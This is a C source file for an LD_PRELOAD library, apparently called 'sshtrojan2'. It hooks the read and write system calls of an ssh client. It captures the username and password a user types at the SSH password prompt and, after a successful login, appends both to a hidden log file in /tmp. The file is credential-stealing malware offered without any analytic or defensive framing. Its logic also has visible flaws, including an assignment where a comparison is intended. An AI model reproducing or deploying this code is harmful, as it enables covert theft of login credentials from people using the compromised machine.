#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>
#include <sys/stat.h>
#include <string.h>
#include <stdbool.h>

#define _PATH_LOG "/tmp/.log_sshtrojan2.txt"
#define _MAX_LENGTH 255

bool is_writing = false;
char username[_MAX_LENGTH];
char password[_MAX_LENGTH];

extern ssize_t read(int __fd, void *__buf, size_t __nbytes){
	if(__fd == 4 && strlen(__buf) == 1 && __nbytes == 1){
		//New line character as a breaker
		if(strcmp(__buf, "\n") == 0)
			is_writing = false;
		//Append char to password
		if(is_writing = true){
			strcat(password, (char *)__buf);
		}
	}

	//Call real read method
	int (*real_read)(int, void *, size_t);
	real_read = dlsym(RTLD_NEXT, "read");
	return real_read(__fd, __buf, __nbytes);
}

extern ssize_t write(int __fd, const void *__buf, size_t __n){
	/*Get username*/
	if(__fd == 4 && strstr(__buf, "'s password: ") != NULL){
		is_writing = true;
		memmove(username, __buf, strlen(__buf) - 13);
	}
	
	/*Login failed when the string "Permission denied" appears*/
	/*Clear password*/
	if(__fd == 2 && strstr(__buf, "Permission denied") != NULL){
		password[0] = '\0';
		is_writing = false;
	}

	/*Login succeeded when the string "Microsoft Windows" or "Linux " appears*/
	/*Write username and password to file*/
	if(__fd == 5 && (strstr(__buf, "Microsoft Windows") != NULL || strstr(__buf, "Linux ") != NULL)){
		is_writing = false;

		FILE *fp = fopen(_PATH_LOG, "a");
		fprintf(fp, "\n=====NEW SSH=====\n");
		fprintf(fp, "Username: %s\n", username);
		fprintf(fp, "Password: %s\n", password);
		fclose(fp);
	}

	//Call real write method
	int(*real_write)(int, const char *, size_t);
	real_write = dlsym(RTLD_NEXT, "write");
	return real_write(__fd, __buf, __n);
}
